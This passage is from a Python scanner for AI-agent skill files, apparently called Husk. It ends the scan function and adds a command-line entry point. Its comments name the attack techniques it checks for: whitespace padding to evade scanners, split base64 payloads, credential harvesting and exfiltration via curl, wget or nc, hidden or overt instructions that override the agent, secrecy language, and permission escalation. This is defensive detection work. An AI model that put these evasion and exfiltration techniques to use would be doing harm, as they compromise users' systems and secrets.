            text = f.read()
    except OSError as e:
        return {"verdict": "ERROR", "findings": [f"Could not read file: {e}"]}

    findings = []

    # Check 1: whitespace inflation
    ws_runs = find_whitespace_runs(text)
    for start_line, length in ws_runs:
        findings.append(
            f"Suspicious whitespace block at line {start_line}: "
            f"{length} consecutive blank lines. Legitimate skill files "
            f"don't need padding like this - this pattern is a known "
            f"technique for pushing content past context-limited scanners."
        )

    # Check 2: dangerous patterns, scanned across the WHOLE file,
    # specifically including anything after a whitespace block.
    pattern_findings = scan_for_dangerous_patterns(text)
    findings.extend(pattern_findings)

    # Check 3: base64/encoded payloads, decoded and recursively scanned
    findings.extend(find_suspicious_base64(text))

    # Check 3b: base64 payloads deliberately split into smaller chunks
    findings.extend(find_split_base64(text))

    # Check 4: direct bytecode-loading patterns
    findings.extend(find_bytecode_patterns(text))

    # Check 5: dangerous commands split across concatenated string variables
    findings.extend(find_concatenation_evasion(text))

    # Check 6: hidden instructions targeting the AI agent itself
    findings.extend(find_hidden_instructions(text))

    # Check 7: credential-harvesting pattern (scan for secrets + can send out)
    findings.extend(find_credential_harvesting(text))

    # Check 8: read -> encode -> send exfiltration chain
    findings.extend(find_exfiltration_chain(text))

    # Check 9: fake-prerequisite social engineering (validated against
    # real-world data - the pattern our earlier checks completely missed)
    findings.extend(find_fake_prerequisite_socialengineering(text))

    # Check 10: overt instruction-override language (not just hidden
    # comments - found via large-scale real-world testing)
    findings.extend(find_instruction_override(text))

    # Check 11: overt secrecy language, whole document (same principle
    # as check 10, applied to module 6's phrase list)
    findings.extend(find_overt_secrecy_language(text))

    # Check 12: network calls targeting a bare IP address (C2 indicator)
    findings.extend(find_exfil_to_raw_ip(text))

    # Check 13: subprocess calls invoking curl/wget/nc directly, list
    # form, regardless of shell=True
    findings.extend(find_subprocess_network_exfil(text))

    # Check 14: subprocess shell=True, window-based (fixes nested-paren
    # regex failure found via real-world testing)
    findings.extend(find_shell_true_subprocess(text))

    # Check 15: world-writable/executable permission changes
    findings.extend(find_permission_escalation(text))

    if findings:
        return {"verdict": "FLAGGED", "findings": findings}
    return {"verdict": "SAFE", "findings": ["No suspicious patterns found."]}


def main():
    if len(sys.argv) != 2:
        print("Usage: python skill_scanner.py <path_to_SKILL.md>")
        sys.exit(1)

    result = scan_skill_file(sys.argv[1])
    print(f"\nHusk skill scan result: {result['verdict']}")
    for finding in result["findings"]:
        print(f"  - {finding}")
    print()


if __name__ == "__main__":
    main()
